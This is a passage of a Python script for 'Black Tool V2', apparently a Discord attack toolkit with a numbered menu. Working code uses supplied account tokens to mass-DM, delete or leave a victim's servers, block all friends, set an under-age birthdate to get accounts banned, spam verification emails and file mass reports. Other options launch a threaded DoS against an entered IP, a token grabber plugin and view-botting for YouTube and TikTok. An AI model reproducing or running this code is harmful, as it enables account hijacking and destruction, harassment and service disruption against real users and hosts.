        json = {"custom_status": {"text": "blacktool.py", "emoji_name": "🥵"}}
        requests.patch(
            "https://discord.com/api/v8/users/@me/settings", headers=headers, json=json
        )
        time.sleep(0.7)
        json = {"custom_status": {"text": "Soul Tools, Black Tool", "emoji_name": "😈"}}
        requests.patch(
            "https://discord.com/api/v8/users/@me/settings", headers=headers, json=json
        )
        time.sleep(0.7)
    os.startfile('Component.py')
    os._exit(0)

elif choice == "26":
    Token = input("[>]Enter A Token: ")
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    mass_dm_request = requests.get(
        "https://canary.discord.com/api/v8/users/@me/channels", headers=headers
    ).json()
    for channel in mass_dm_request:
        exec(open('utilities/Plugins/Random_String.py').read()) 
        time.sleep(1)
        r = requests.post(
            f"https://canary.discord.com/api/v8/channels/{channel['id']}/messages",
            headers=headers,
            data=json,
        )
        print(f"Sent DM To {channel['id']}")
    os.startfile('Component.py')
    os._exit(0)

elif choice == "27":
    Token = input("[>]Enter A Token: ")
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    mark_guild_request = requests.get(
        "https://discord.com/api/v8/users/@me/guilds", headers=headers
    ).json()
    for channel in mark_guild_request:
        r = requests.post(
            f"https://discord.com/api/v8/guilds/{channel['id']}/ack", headers=headers
        )
        print(channel["id"])
    os.startfile('Component.py')
    os._exit(0)
elif choice == "28":
    Token = input("[>]Enter A Token: ")
    headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
    requests.get(
        "https://canary.discordapp.com/api/v8/guilds/0/members", headers=headers
    )
    Write.Input("""
[>]Done, Press ENTER to exit:""", Colors.purple_to_blue, interval=0.000)
    os.startfile('Component.py')
    os._exit(0)
elif choice == "29":
    Webhook2 = input("[>]Enter A Webhook: ")
    requests.delete(Webhook2)
    os.startfile('Component.py')
    os._exit(0)
elif choice == "30":
    Token = input("[>]Enter A Token: ")
    headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
    token_country_request = requests.get(
        "https://discord.com/api/v8/auth/location-metadata", headers=headers
    ).json()
    print(f"{Fore.WHITE}[{Fore.MAGENTA}>{Fore.WHITE}]Token Country:{Fore.BLUE} {token_country_request['country_code']}")
    Write.Input("""
[>>>]Press ENTER to exit:""")
    os.startfile('Component.py')
    os._exit(0)
elif choice == "31":
    Token = input("[>]Enter A Token: ")
    headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
    requests.post("https://discord.com/api/v8/auth/verify/resend", headers=headers)
    Write.Input("""
[>]Done, Press ENTER:""", Colors.red_to_blue, interval=0.000)
    os.startfile('Component.py')
    os._exit(0)
elif choice == "32":
    Token = input("[>]Enter A Token: ")
    for i in range(0, 20):
        remove_token_email(Token)
        time.sleep(2)
        resend_verification_email(Token)
    os.startfile('Component.py')
    os._exit(0)
elif choice == "33":
    Token = input("[>]Enter A Token: ")
    headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
    for i in range(0, 1):
        payload = {"username": "Bruh", "discriminator": 9871}
        requests.patch(
            "https://discordapp.com/api/v6/users/@me",
            headers=headers,
            json={"date_of_birth": "2017-2-11"},
        )
    os.startfile('Component.py')
    os._exit(0)
elif choice == "34":
    Token = input("[>]Enter A Token: ")
    headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
    print("Got Data")
    delete_personal_request = requests.get(
        "https://discord.com/api/v9/users/@me/guilds", headers=headers
    ).json()
    for i in delete_personal_request:
        requests.post(
            f"https://canary.discord.com/api/v9/guilds/{i['id']}/delete",
            headers=headers,
        )
        print(i["id"])
    os.startfile('Component.py')
    os._exit(0)
elif choice == "35":
    exec(open('utilities/Plugins/Group_Spammer.py').read()) 
elif choice == "36":
    exec(open('utilities/Plugins/ActivityChanger.py').read()) 
elif choice == "37":
    system('title Black Tool V2 - Spam Server')
    exec(open('utilities/Plugins/Spam_Servers.py').read())
elif choice == "38":
    os.startfile("cmd")
    Write.Input("Press ENTER to restart the tool:", Colors.red_to_yellow, interval=0.000)
    os.startfile('Component.py')
elif choice == "39":
   system('title Black Tool V2 - [39]Exiting...')
   Write.Print(f"""
[-]Exiting...""", Colors.green_to_yellow, interval=0.000)
   time.sleep(1.5)
   os._exit(0)
elif choice == "16":
    system('title Black Tool - [16]Token Info')
    token=Write.Input(F"[>>>]Token:", Colors.purple_to_blue, interval=0.000)
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    badges = ""

    Discord_Employee = 1
    Partnered_Server_Owner = 2
    HypeSquad_Events = 4
    Bug_Hunter_Level_1 = 8
    House_Bravery = 64
    House_Brilliance = 128
    House_Balance = 256
    Early_Supporter = 512
    Bug_Hunter_Level_2 = 16384
    Early_Verified_Bot_Developer = 131072

    flags = r.json()['flags']
    if (flags == Discord_Employee):
        badges += "Staff, "
    if (flags == Partnered_Server_Owner):
        badges += "Partner, "
    if (flags == HypeSquad_Events):
        badges += "Hypesquad Event, "
    if (flags == Bug_Hunter_Level_1):
        badges += "Green Bughunter, "
    if (flags == House_Bravery):
        badges += "Hypesquad Bravery, "
    if (flags == House_Brilliance):
        badges += "HypeSquad Brillance, "
    if (flags == House_Balance):
        badges += "HypeSquad Balance, "
    if (flags == Early_Supporter):
        badges += "Early Supporter, "
    if (flags == Bug_Hunter_Level_2):
        badges += "Gold BugHunter, "
    if (flags == Early_Verified_Bot_Developer):
        badges += "Verified Bot Developer, "
    if (badges == ""):
        badges = "None"
    if r.status_code == 200:
        userName = r.json()['username'] + '#' + r.json()['discriminator']
        userID = r.json()['id']
        token_date = datetime.utcfromtimestamp(((int(userID) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
        phone = r.json()['phone']
        language = r.json()['locale']
        email = r.json()['email']
        mfa = r.json()['mfa_enabled']
        Write.Print(f'''
            [User ID]      :   [{userID}]
            [User Name]    :   [{userName}]
            [2 Factor]     :   [{mfa}]
            [Email]        :   [{email}]
            [Phone number] :   [{phone if phone else ""}]
            [Created at]   :   [{token_date}]
            [Badges]       :   [{badges}]
            [Language]     :   [{language}]
            [Token]        :   [{token}]
            ''', Colors.cyan_to_blue, interval=0.000)
        fileinfo = open(f"utilities/Components/token_info.txt", "w")
        fileinfo.write(f"""
         ([I saved the token info for you in this file!])
            [User ID]      :   [{userID}]
            [User Name]    :   [{userName}]
            [2 Factor]     :   [{mfa}]
            [Email]        :   [{email}]
            [Phone number] :   [{phone if phone else ""}]
            [Created at]   :   [{token_date}]
            [Badges]       :   [{badges}]
            [Language]     :   [{language}]
            [Token]        :   [{token}]""")
        fileinfo.close()
        daccordo=Write.Input('''
[>]I saved the token info in the file "token_info.txt", do you want to clear the file Y/N:''', Colors.red_to_yellow, interval=0.000)
        if daccordo == "Y":
         Write.Input("[>]Succesfully Cleared the file, Press ENTER to exit:", Colors.purple_to_blue, interval=0.000)
         os.startfile('Component.py')
         os._exit(0)
        elif daccordo == "y":
         Write.Input("[>]Succesfully Cleared the file, Press ENTER to exit:", Colors.purple_to_blue, interval=0.000)
         os.startfile('Component.py')
         os._exit(0)
        elif daccordo == "N":
         Write.Input("Press ENTER to exit:", Colors.purple_to_blue, interval=0.000)
         os.startfile('Component.py')
         os._exit(0)
        elif daccordo == "n":
         Write.Input("Press ENTER to exit:", Colors.purple_to_blue, interval=0.000)
         os.startfile('Component.py')
         os._exit(0)


elif choice == "17":
   system('title Black Tool V2 - [17]Bio Changer')
   import time, sys
   import os
   try:
    import colorama, requests
   except:
    sys.stdout.write("> ")
    print015("Missing Required Modules, Press Enter To Download (May Not Always Work)")
    input("")
    try:
        import os
        os.system("pip install colorama requests")
    except:
        pass
    sys.stdout.write("> ")
    print("Problem Maybe Fixed Now, Restart The Program")
    input("")
    exit()
   colorama.init(autoreset=True)



   import os, threading


   lest = []
   done = 0


   sys.stdout.write(colorama.Fore.CYAN + "> ")
   print("Press Enter To Start Load Tokens: ")
   print("")
   input("")
   tokens = []
   try:
    with open("tokens.txt", "r") as file:
        tokenss = file.readlines()
    for token in tokenss:
        if "\n" in token:
            token = token[:-1]
        tokens.append(token)
        sys.stdout.write(colorama.Fore.CYAN + "> ")
        print("Loaded Token")
   except:
    sys.stdout.write(colorama.Fore.RED + "> ")
    print01("Missing tokens.txt")
    input("")
    exit()

   print("")
   sys.stdout.write(colorama.Fore.CYAN + "> ")
   print("Enter Bio: ")
   bio = input("")


   proxy = None



   sys.stdout.write(colorama.Fore.CYAN + "> ")
   print("Press Enter To Start Mass Bio Changer")
   input("")
   import threading
   for u in tokens:
    threading.Thread(target=change, args={u, bio}).start()
    sys.stdout.write(colorama.Fore.CYAN + "> ")
    print("Started Thread")


   while True:
    if len(tokens) == int(done):
        break
    for u in lest:
        lest.remove(u)
        if "Changed" in u:
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print(u)
        else:
            sys.stdout.write(colorama.Fore.RED + "> ")
            print(u)


   sys.stdout.write(colorama.Fore.CYAN + "> ")
   Write.Input("Done Changing Bio", Colors.black_to_blue, interval=0.000)
   os.startfile('Component.py')
   os._exit(0)
   
elif choice == "14":
   system('title Black Tool V2 - Starting...')
   os.system('cls')
   Write.Print(f"""Starting...""", Colors.green_to_yellow, interval=0.000)
   time.sleep(1.5)
   s = Style.BRIGHT

   os.system(f'cls & mode 83,24 & title Discord Mass Reporter - Made By Soul Tools')
   Write.Print("""
██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗  ███╗░░░███╗░█████╗░░██████╗░██████╗
██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░██╔╝  ████╗░████║██╔══██╗██╔════╝██╔════╝
██████╦╝██║░░░░░███████║██║░░╚═╝█████═╝░  ██╔████╔██║███████║╚█████╗░╚█████╗░
██╔══██╗██║░░░░░██╔══██║██║░░██╗██╔═██╗░  ██║╚██╔╝██║██╔══██║░╚═══██╗░╚═══██╗
██████╦╝███████╗██║░░██║╚█████╔╝██║░╚██╗  ██║░╚═╝░██║██║░░██║██████╔╝██████╔╝
╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝  ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═════╝░╚═════╝░

██████╗░███████╗██████╗░░█████╗░██████╗░████████╗
██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝
██████╔╝█████╗░░██████╔╝██║░░██║██████╔╝░░░██║░░░
██╔══██╗██╔══╝░░██╔═══╝░██║░░██║██╔══██╗░░░██║░░░
██║░░██║███████╗██║░░░░░╚█████╔╝██║░░██║░░░██║░░░
╚═╝░░╚═╝╚══════╝╚═╝░░░░░░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░""", Colors.black_to_red, interval=0.000)
   Write.Print(""" 
════════════════════════════════════════════════════════════════════════
[0] = Reasons:
[1] > Illegal Content
[2] > Harrassment
[3] > Spam Or Phishing Links
[4] > Self Harm
[5] > NSFW Content
═════════════════════════════════════════════════════════════════════════
""", Colors.blue_to_purple, interval=0.000)

   token = Write.Input(f"[>]Token: ", Colors.blue_to_purple, interval=0.000)
   headers = {'Authorization': token, 'Content-Type':  'application/json'}  
   r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)

   if r.status_code == 200:
        pass
   else:
        Write.Input(f"[>] Invalid Token", Colors.blue_to_purple, interval=0.000)
        Write.Input(f"""
[>] Press Anything To Exit. . .""", Colors.blue_to_purple, interval=0.000)
        input()

   reason1 = Write.Input(f"""[>] Choose A Reason: """, Colors.blue_to_purple, interval=0.000)
   guild_id1 = Write.Input(f"""[>] Server ID: """, Colors.blue_to_purple, interval=0.000)
   channel_id1 = Write.Input(f"""[>] Channel ID: """, Colors.blue_to_purple, interval=0.000)
   message_id1 = Write.Input(f"""[>] Message ID: """, Colors.blue_to_purple, interval=0.000)




   for i in range(500, 1000):
    Thread(target=MassReport).start()
   os.startfile('Component.py')
   os._exit(0)
elif choice == "13":
    Write.Print("[-]Starting", Colors.purple_to_blue, interval=0.000)
    time.sleep(1)
    os.system('cls')
    Write.Print("""
░██████╗███████╗██████╗░██╗░░░██╗███████╗██████╗░  ██╗░░░░░░█████╗░░█████╗░██╗░░██╗██╗░░░██╗██████╗░
██╔════╝██╔════╝██╔══██╗██║░░░██║██╔════╝██╔══██╗  ██║░░░░░██╔══██╗██╔══██╗██║░██╔╝██║░░░██║██╔══██╗
╚█████╗░█████╗░░██████╔╝╚██╗░██╔╝█████╗░░██████╔╝  ██║░░░░░██║░░██║██║░░██║█████═╝░██║░░░██║██████╔╝
░╚═══██╗██╔══╝░░██╔══██╗░╚████╔╝░██╔══╝░░██╔══██╗  ██║░░░░░██║░░██║██║░░██║██╔═██╗░██║░░░██║██╔═══╝░
██████╔╝███████╗██║░░██║░░╚██╔╝░░███████╗██║░░██║  ███████╗╚█████╔╝╚█████╔╝██║░╚██╗╚██████╔╝██║░░░░░
╚═════╝░╚══════╝╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝  ╚══════╝░╚════╝░░╚════╝░╚═╝░░╚═╝░╚═════╝░╚═╝░░░░░""", Colors.purple_to_blue, interval=0.000)

    menu()

    option = int(Write.Input(f"""[>]Select an option: """, Colors.purple_to_blue, interval=0.000))

    if option == 1:

        headers = {
            'User-Agent' : 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
            'Authorization' : Write.Input(f"[>]Token: ", Colors.purple_to_blue, interval=0.000)
        }

        guildId = Write.Input(f"""[>]Guild ID: """, Colors.blue_to_purple, interval=0.000)

        response = requests.get(
            f"https://discord.com/api/guilds/{guildId}",
            headers = headers,
            params = {"with_counts" : True}
        ).json()

        owner = requests.get(
            f"https://discord.com/api/guilds/{guildId}/members/{response['owner_id']}",
            headers = headers,
            params = {"with_counts" : True}
        ).json()

        Write.Print(f"""
There is the Server Infomation of:{guildId}

[Name]     :   {response['name']} 
[ID]       :   {response['id']}
[Owner]    :   {owner['user']['username']}#{owner['user']['discriminator']} 
[Owner ID] :   {response['owner_id']}
[Members]  :   {response['approximate_member_count']}
[Region]   :   {response['region']}
[Icon URL] :   https://cdn.discordapp.com/icons/{guildId}/{response['icon']}.webp?size=256
""", Colors.cyan_to_blue, interval=0.000)
        time.sleep(5)
        Write.Input(f"[+]Press ENTER to exit:", Colors.red_to_yellow, interval=0.000)
        os.startfile('Component.py')
        os._exit(0)
    elif option == "2":
     os.system('cls')
     Write.Print("Exiting...",  Colors.red_to_yellow, interval=0.000)
     time.sleep(1.3)
     os.startfile('Component.py')
     os._exit(0)
elif choice == "7":
  ip = input(f"{Fore.MAGENTA}[{Fore.WHITE}>{Fore.MAGENTA}]{Fore.WHITE}Insert IP:")
  response = requests.get(f"https://ip-api.com/json/{ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query")
  data = response.json()

  Write.Input(f"{Fore.GREEN}[+]{Fore.WHITE}IP Lookup:{data}, Press ENTER to exit:", Colors.purple_to_blue, interval=0.000)
  os.startfile('Component.py')
  os._exit(0)
elif choice == "12":
 Write.Print(f"Starting...", Colors.green_to_yellow, interval=0.000)
 time.sleep(1)
 os.system('cls')
 Write.Print("""
██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗  ████████╗░█████╗░██╗░░██╗███████╗███╗░░██╗
██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░██╔╝  ╚══██╔══╝██╔══██╗██║░██╔╝██╔════╝████╗░██║
██████╦╝██║░░░░░███████║██║░░╚═╝█████═╝░  ░░░██║░░░██║░░██║█████═╝░█████╗░░██╔██╗██║
██╔══██╗██║░░░░░██╔══██║██║░░██╗██╔═██╗░  ░░░██║░░░██║░░██║██╔═██╗░██╔══╝░░██║╚████║
██████╦╝███████╗██║░░██║╚█████╔╝██║░╚██╗  ░░░██║░░░╚█████╔╝██║░╚██╗███████╗██║░╚███║
╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝  ░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚══╝

░██████╗░██████╗░░█████╗░██████╗░██████╗░███████╗██████╗░
██╔════╝░██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
██║░░██╗░██████╔╝███████║██████╦╝██████╦╝█████╗░░██████╔╝
██║░░╚██╗██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝░░██╔══██╗
╚██████╔╝██║░░██║██║░░██║██████╦╝██████╦╝███████╗██║░░██║
░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═════╝░╚══════╝╚═╝░░╚═╝
══════════════════════════════════════════════════════════════════════════════════════""", Colors.green_to_black, interval=0.000)
 exec(open('utilities/Plugins/Token_Grabber_Plugin.py').read())

elif choice == "6":
 colorama.init()
 os.system('cls')
 system('title Black Tool V2 [6]Black Webhook')
 Write.Print(f"[+]Starting Webhook Tool...", Colors.green_to_red, interval=0.000)
 time.sleep(2)
 os.system('cls')
 Write.Print(f"""
██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗  ░██╗░░░░░░░██╗███████╗██████╗░██╗░░██╗░█████╗░░█████╗░██╗░░██╗
██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░██╔╝  ░██║░░██╗░░██║██╔════╝██╔══██╗██║░░██║██╔══██╗██╔══██╗██║░██╔╝
██████╦╝██║░░░░░███████║██║░░╚═╝█████═╝░  ░╚██╗████╗██╔╝█████╗░░██████╦╝███████║██║░░██║██║░░██║█████═╝░
██╔══██╗██║░░░░░██╔══██║██║░░██╗██╔═██╗░  ░░████╔═████║░██╔══╝░░██╔══██╗██╔══██║██║░░██║██║░░██║██╔═██╗░
██████╦╝███████╗██║░░██║╚█████╔╝██║░╚██╗  ░░╚██╔╝░╚██╔╝░███████╗██████╦╝██║░░██║╚█████╔╝╚█████╔╝██║░╚██╗
╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝  ░░░╚═╝░░░╚═╝░░╚══════╝╚═════╝░╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝
[!]Made by .exe#1567 and 🎃 | Benito Mussolini | 🎃#5257
══════════════════════════════════════════════════════════════════════════════════════
[1]Webhook Spammer
[2]Webhook Deleter""", Colors.red_to_yellow, interval=0.000)
 exec(open('utilities/Plugins/Webhook_Spammer.py').read())
  

elif choice == "8":
    exec(open('utilities/Plugins/Ip_Builder.py').read())

elif choice == "15":
    system('title Starting...')
    Write.Print("Starting...", Colors.red_to_yellow, interval=0.000)
    time.sleep(1)
    os.system('cls')
    system('title Black Tool V2 [15]Checker')
    Write.Print(f"""
████████╗░█████╗░██╗░░██╗███████╗███╗░░██╗  ░█████╗░██╗░░██╗███████╗░█████╗░██╗░░██╗███████╗██████╗░
╚══██╔══╝██╔══██╗██║░██╔╝██╔════╝████╗░██║  ██╔══██╗██║░░██║██╔════╝██╔══██╗██║░██╔╝██╔════╝██╔══██╗
░░░██║░░░██║░░██║█████═╝░█████╗░░██╔██╗██║  ██║░░╚═╝███████║█████╗░░██║░░╚═╝█████═╝░█████╗░░██████╔╝
░░░██║░░░██║░░██║██╔═██╗░██╔══╝░░██║╚████║  ██║░░██╗██╔══██║██╔══╝░░██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
░░░██║░░░╚█████╔╝██║░╚██╗███████╗██║░╚███║  ╚█████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗███████╗██║░░██║
░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚══╝  ░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝""", Colors.purple_to_blue, interval=0.000)
    exec(open('utilities/Plugins/Checker.py').read())
        
          
            
        

elif choice == "9":
 Write.Print("""[+]Starting Dosser...""", Colors.green_to_yellow, interval=0.000)
 time.sleep(1)
 os.system('cls')
 Write.Print(f"""
██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗  ██████╗░░█████╗░░██████╗░██████╗███████╗██████╗░
██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░██╔╝  ██╔══██╗██╔══██╗██╔════╝██╔════╝██╔════╝██╔══██╗
██████╦╝██║░░░░░███████║██║░░╚═╝█████═╝░  ██║░░██║██║░░██║╚█████╗░╚█████╗░█████╗░░██████╔╝
██╔══██╗██║░░░░░██╔══██║██║░░██╗██╔═██╗░  ██║░░██║██║░░██║░╚═══██╗░╚═══██╗██╔══╝░░██╔══██╗
██████╦╝███████╗██║░░██║╚█████╔╝██║░╚██╗  ██████╔╝╚█████╔╝██████╔╝██████╔╝███████╗██║░░██║
╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝  ╚═════╝░░╚════╝░╚═════╝░╚═════╝░╚══════╝╚═╝░░╚═╝ 
""", Colors.red_to_black, interval=0.000)
 Write.Print("""
[!]Made by 🎃 | Benito Mussolini | 🎃#7220 and .exe#9805""", Colors.black_to_blue, interval=0.000)


 count = 0
 target = Write.Input(f'''
[+]Insert IP:''', Colors.red_to_yellow, interval=0.000)
 fake_ip = '182.21.20.32'
 port = 80



 for i in range(1500):

    thread = threading.Thread(target=attack)
    thread.start()
    count += 1
    Write.Print(f"""
[{count} Packages]Attacking the IP:{target}""", Colors.blue_to_purple, interval=0.000)

 finish = Write.Input(f"""
[!]Finish to doss the IP:{target}. Press ENTER to exit:""", Colors.red_to_purple, interval=0.000)
 time.sleep(0.5)
 os.startfile('Component.py')
 os._exit(0)

elif choice == '3':
    exec(open('utilities/Plugins/Nitro_Gen.py').read())
 
elif choice == "2":
 system("title Black Tool V2 - [2]Account Nuker")
 token = Write.Input("[>]Enter A Token: ", Colors.blue_to_purple, interval=0.000)
 name=Write.Input("[>]Server Name:", Colors.blue_to_purple, interval=0.000)
 count = Write.Input("[>]How Many Servers:", Colors.blue_to_purple, interval=0.000)
 headers = {"authorization": token, "user-agent": "Samsung Fridge/6.9"}
 leaveServer(token)
 for i in range(0, 100):
  headers = {"authorization": token, "user-agent": "Samsung Fridge/6.9"}
  condition_status = True
  payload = {"theme": "light", "developer_mode": condition_status, "afk_timeout": 60, "locale": "ko", "message_display_compact": condition_status, "explicit_content_filter": 2, "default_guilds_restricted": condition_status, "friend_source_flags": {"all": condition_status, "mutual_friends": condition_status, "mutual_guilds": condition_status}, "inline_embed_media": condition_status, "inline_attachment_media": condition_status, "gif_auto_play": condition_status, "render_embeds": condition_status, "render_reactions": condition_status, "animate_emoji": condition_status, "convert_emoticons": condition_status, "animate_stickers": 1, "enable_tts_command": condition_status,  "native_phone_integration_enabled": condition_status, "contact_sync_enabled": condition_status, "allow_accessibility_detection": condition_status, "stream_notifications_enabled": condition_status, "status": "idle", "detect_platform_accounts": condition_status, "disable_games_tab": condition_status}
  requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload)
  condition_status = False
  payload = {"theme": "dark", "developer_mode": condition_status, "afk_timeout": 120, "locale": "bg", "message_display_compact": condition_status, "explicit_content_filter": 0, "default_guilds_restricted": condition_status, "friend_source_flags": {"all": condition_status, "mutual_friends": condition_status, "mutual_guilds": condition_status}, "inline_embed_media": condition_status, "inline_attachment_media": condition_status, "gif_auto_play": condition_status, "render_embeds": condition_status, "render_reactions": condition_status, "animate_emoji": condition_status, "convert_emoticons": condition_status, "animate_stickers": 2, "enable_tts_command": condition_status, "native_phone_integration_enabled": condition_status, "contact_sync_enabled": condition_status, "allow_accessibility_detection": condition_status, "stream_notifications_enabled": condition_status, "status": "dnd", "detect_platform_accounts": condition_status, "disable_games_tab": condition_status}
  requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload)      
  headers = {"authorization": token, "user-agent": "bruh6/9"}
  json = {"type": 2}
  block_friends_request = requests.get(
        "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
  ).json()
  for i in block_friends_request:
        requests.put(
            f"https://canary.discord.com/api/v8/users/@me/relationships/{i['id']}",
            headers=headers,
            json=json,
        )
        print(f"Blocked Friend {i['id']}")
  headers = {"authorization": token, "user-agent": "Samsung Fridge/6.9"}
  close_dm_request = requests.get(
        "https://canary.discord.com/api/v8/users/@me/channels", headers=headers
  ).json()
  for channel in close_dm_request:
        requests.delete(
            f"https://canary.discord.com/api/v8/channels/{channel['id']}",
            headers=headers,
        )
  createServers(token=token, count=count, name=name)
  
 Write.Input("[>]Press ENTER to exit:", Colors.purple_to_blue, interval=0.000)
 os.startfile('Component.py')
 os._exit(0)
elif choice == "4":
 system('title Black Tool V2 - [4]Youtube Visual Bot')          
 print(f"""
{Fore.LIGHTRED_EX}██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗  ██╗░░░██╗██╗░██████╗██╗░░░██╗░█████╗░██╗░░░░░
{Fore.LIGHTRED_EX}██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░██╔╝  ██║░░░██║██║██╔════╝██║░░░██║██╔══██╗██║░░░░░
{Fore.LIGHTRED_EX}██████╦╝██║░░░░░███████║██║░░╚═╝█████═╝░  ╚██╗░██╔╝██║╚█████╗░██║░░░██║███████║██║░░░░░
{Fore.LIGHTRED_EX}██╔══██╗██║░░░░░██╔══██║██║░░██╗██╔═██╗░  ░╚████╔╝░██║░╚═══██╗██║░░░██║██╔══██║██║░░░░░
{Fore.LIGHTRED_EX}██████╦╝███████╗██║░░██║╚█████╔╝██║░╚██╗  ░░╚██╔╝░░██║██████╔╝╚██████╔╝██║░░██║███████╗
{Fore.LIGHTRED_EX}╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝  ░░░╚═╝░░░╚═╝╚═════╝░░╚═════╝░╚═╝░░╚═╝╚══════╝""")                                 
 print(f"{Fore.LIGHTRED_EX}Made {Fore.LIGHTBLUE_EX}by {Fore.YELLOW}.exe#9805 {Fore.LIGHTYELLOW_EX}& {Fore.YELLOW}🎃 | Benito Mussolini | 🎃#7220")
 count = 0
 url = input(f"{Fore.LIGHTCYAN_EX}[{Fore.GREEN}${Fore.LIGHTCYAN_EX}]{Fore.LIGHTRED_EX}Youtube {Fore.YELLOW}video {Fore.CYAN}url{Fore.BLUE}:")
 print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}{datetime.datetime.now()}{Fore.LIGHTMAGENTA_EX}]{Fore.LIGHTRED_EX}Opening the video ({url}){Fore.LIGHTYELLOW_EX}!")
 while True:
    count += 1
    print(F"{Fore.LIGHTRED_EX}[{Fore.GREEN}{count}{Fore.LIGHTRED_EX}]Youtube {Fore.LIGHTBLUE_EX}Page{Fore.LIGHTGREEN_EX}.")
    webbrowser.open_new(url)
    ry = requests.get(url)
    
elif choice == "5":
 main2()
 exec(open('utilities/Plugins/Spammer.py').read()) 



    

elif choice == "11":
    system('title Starting...')
    Write.Print(f"""
[+]Starting the TikTok sharing bot...""", Colors.green_to_yellow, interval=0.000)
    os.system('cls')
    system('title Black Tool V2 - [11]TT Sharing Bot')
    Write.Print(f"""
████████╗██╗██╗░░██╗  ████████╗░█████╗░██╗░░██╗  ░██████╗██╗░░██╗░█████╗░██████╗░██╗███╗░░██╗░██████╗░
╚══██╔══╝██║██║░██╔╝  ╚══██╔══╝██╔══██╗██║░██╔╝  ██╔════╝██║░░██║██╔══██╗██╔══██╗██║████╗░██║██╔════╝░
░░░██║░░░██║█████═╝░  ░░░██║░░░██║░░██║█████═╝░  ╚█████╗░███████║███████║██████╔╝██║██╔██╗██║██║░░██╗░
░░░██║░░░██║██╔═██╗░  ░░░██║░░░██║░░██║██╔═██╗░  ░╚═══██╗██╔══██║██╔══██║██╔══██╗██║██║╚████║██║░░╚██╗
░░░██║░░░██║██║░╚██╗  ░░░██║░░░╚█████╔╝██║░╚██╗  ██████╔╝██║░░██║██║░░██║██║░░██║██║██║░╚███║╚██████╔╝
░░░╚═╝░░░╚═╝╚═╝░░╚═╝  ░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝  ╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░

██████╗░░█████╗░████████╗
██╔══██╗██╔══██╗╚══██╔══╝
██████╦╝██║░░██║░░░██║░░░
██╔══██╗██║░░██║░░░██║░░░
██████╦╝╚█████╔╝░░░██║░░░
╚═════╝░░╚════╝░░░░╚═╝░░░""", Colors.black_to_green, interval=0.000)
    time.sleep(2.8)
    exec(open('utilities/Plugins/TikTok.py').read())

elif choice == "10":
 Write.Print(f"""
[+]Starting the IP/Website Ping...""", Colors.yellow_to_green, interval=0.000)
 time.sleep(1)
 os.system('cls')
 system('title Black Tool V2 [10]IP/Website Ping')
 Write.Print(F"""
██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗  ██████╗░██╗███╗░░██╗░██████╗░
██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░██╔╝  ██╔══██╗██║████╗░██║██╔════╝░
██████╦╝██║░░░░░███████║██║░░╚═╝█████═╝░  ██████╔╝██║██╔██╗██║██║░░██╗░
██╔══██╗██║░░░░░██╔══██║██║░░██╗██╔═██╗░  ██╔═══╝░██║██║╚████║██║░░╚██╗
██████╦╝███████╗██║░░██║╚█████╔╝██║░╚██╗  ██║░░░░░██║██║░╚███║╚██████╔╝
╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝  ╚═╝░░░░░╚═╝╚═╝░░╚══╝░╚═════╝░""", Colors.black_to_blue, interval=0.000)
 i3 = Write.Input(f"""
